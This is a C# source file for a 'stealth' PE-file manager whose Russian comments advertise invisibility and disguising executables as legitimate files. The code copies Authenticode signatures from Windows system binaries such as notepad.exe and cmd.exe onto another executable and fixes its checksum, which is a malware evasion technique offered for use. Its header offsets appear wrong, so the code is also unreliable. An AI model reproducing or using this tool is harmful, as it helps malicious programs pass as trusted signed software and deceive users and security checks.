using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый менеджер PE-файлов
    /// - Клонирование цифровых подписей (Authenticode)
    /// - Поддержка 32/64 бит
    /// - Автоматическое исправление контрольных сумм
    /// - Маскировка под легитимные файлы
    /// </summary>
    public class PEManager
    {
        #region Константы
        private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
        private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE\0\0
        private const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b; // PE32
        private const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b; // PE32+
        private const int IMAGE_DIRECTORY_ENTRY_SECURITY = 4;
        #endregion

        #region WinAPI
        [DllImport("wintrust.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int WinVerifyTrust(IntPtr hWnd, [MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID, IntPtr pWinTrustData);

        private static readonly Guid WINTRUST_ACTION_GENERIC_VERIFY_V2 = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct WINTRUST_FILE_INFO
        {
            public int cbStruct;
            public string pcwszFilePath;
            public IntPtr hFile;
            public IntPtr pgKnownSubject;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WINTRUST_DATA
        {
            public int cbStruct;
            public IntPtr pPolicyCallbackData;
            public IntPtr pSIPClientData;
            public uint dwUIChoice;
            public uint fdwRevocationChecks;
            public uint dwUnionChoice;
            public IntPtr pFile;
            public uint dwStateAction;
            public IntPtr hWVTStateData;
            public string pwszURLReference;
            public uint dwProvFlags;
            public uint dwUIContext;
        }
        #endregion

        public static bool CloneSignature(string srcPath, string dstPath)
        {
            try
            {
                if (!File.Exists(srcPath) || !File.Exists(dstPath)) return false;

                byte[] srcData = File.ReadAllBytes(srcPath);
                int peOffset = BitConverter.ToInt32(srcData, 0x3C);
                short magic = BitConverter.ToInt16(srcData, peOffset + 24);
                int dirOffset = peOffset + 24 + (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC ? 128 : 144);
                
                uint sigVa = BitConverter.ToUInt32(srcData, dirOffset);
                uint sigSize = BitConverter.ToUInt32(srcData, dirOffset + 4);

                if (sigVa == 0 || sigSize == 0 || sigVa + sigSize > srcData.Length) return false;

                byte[] signature = new byte[sigSize];
                Array.Copy(srcData, (int)sigVa, signature, 0, (int)sigSize);

                byte[] dstData = File.ReadAllBytes(dstPath);
                int dstPeOffset = BitConverter.ToInt32(dstData, 0x3C);
                short dstMagic = BitConverter.ToInt16(dstData, dstPeOffset + 24);
                int dstDirOffset = dstPeOffset + 24 + (dstMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC ? 128 : 144);

                using (FileStream fs = new FileStream(dstPath, FileMode.Open, FileAccess.ReadWrite))
                {
                    fs.Seek(dstDirOffset, SeekOrigin.Begin);
                    fs.Write(BitConverter.GetBytes((uint)dstData.Length), 0, 4);
                    fs.Write(BitConverter.GetBytes((uint)signature.Length), 0, 4);

                    fs.Seek(0, SeekOrigin.End);
                    fs.Write(signature, 0, signature.Length);
                }

                RecalculateChecksum(dstPath);
                return IsFileSigned(dstPath);
            }
            catch { return false; }
        }

        public static bool CloneFromSystem(string dstPath)
        {
            string[] systemFiles = {
                @"C:\Windows\System32\notepad.exe",
                @"C:\Windows\System32\calc.exe",
                @"C:\Windows\System32\cmd.exe",
                @"C:\Windows\System32\explorer.exe",
                @"C:\Windows\System32\winver.exe",
                @"C:\Windows\System32\rundll32.exe",
                @"C:\Windows\System32\taskmgr.exe"
            };

            foreach (string src in systemFiles)
            {
                if (File.Exists(src) && CloneSignature(src, dstPath)) return true;
            }
            return false;
        }

        public static bool IsFileSigned(string filePath)
        {
            try
            {
                var wfi = new WINTRUST_FILE_INFO { cbStruct = Marshal.SizeOf(typeof(WINTRUST_FILE_INFO)), pcwszFilePath = filePath, hFile = IntPtr.Zero, pgKnownSubject = IntPtr.Zero };
                var wtd = new WINTRUST_DATA { cbStruct = Marshal.SizeOf(typeof(WINTRUST_DATA)), dwUnionChoice = 1, pFile = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WINTRUST_FILE_INFO))), dwUIChoice = 2, dwProvFlags = 0x00000040 };
                Marshal.StructureToPtr(wfi, wtd.pFile, false);
                IntPtr pWtd = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WINTRUST_DATA)));
                Marshal.StructureToPtr(wtd, pWtd, false);
                int result = WinVerifyTrust(IntPtr.Zero, WINTRUST_ACTION_GENERIC_VERIFY_V2, pWtd);
                Marshal.FreeHGlobal(wtd.pFile);
                Marshal.FreeHGlobal(pWtd);
                return result == 0;
            }
            catch { return false; }
        }

        public static void RecalculateChecksum(string filePath)
        {
            try
            {
                byte[] data = File.ReadAllBytes(filePath);
                int peOffset = BitConverter.ToInt32(data, 0x3C);
                int magic = BitConverter.ToInt16(data, peOffset + 24);
                int checkSumOffset = peOffset + 24 + (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC ? 64 : 72);
                uint newCheckSum = CalculateCheckSum(data, checkSumOffset);
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Write))
                {
                    fs.Seek(checkSumOffset, SeekOrigin.Begin);
                    fs.Write(BitConverter.GetBytes(newCheckSum), 0, 4);
                }
            }
            catch { }
        }

        private static uint CalculateCheckSum(byte[] data, int originalSumOffset)
        {
            uint checksum = 0;
            for (int i = 0; i < data.Length; i += 2)
            {
                if (i == originalSumOffset || i == originalSumOffset + 2) continue;
                uint word = (i + 1 < data.Length) ? (uint)(data[i] | (data[i + 1] << 8)) : (uint)data[i];
                checksum += word;
                if ((checksum & 0x80000000) != 0) checksum = (checksum & 0xFFFF) + (checksum >> 16);
            }
            checksum = (checksum & 0xFFFF) + (checksum >> 16);
            checksum += (uint)data.Length;
            return checksum;
        }
    }
}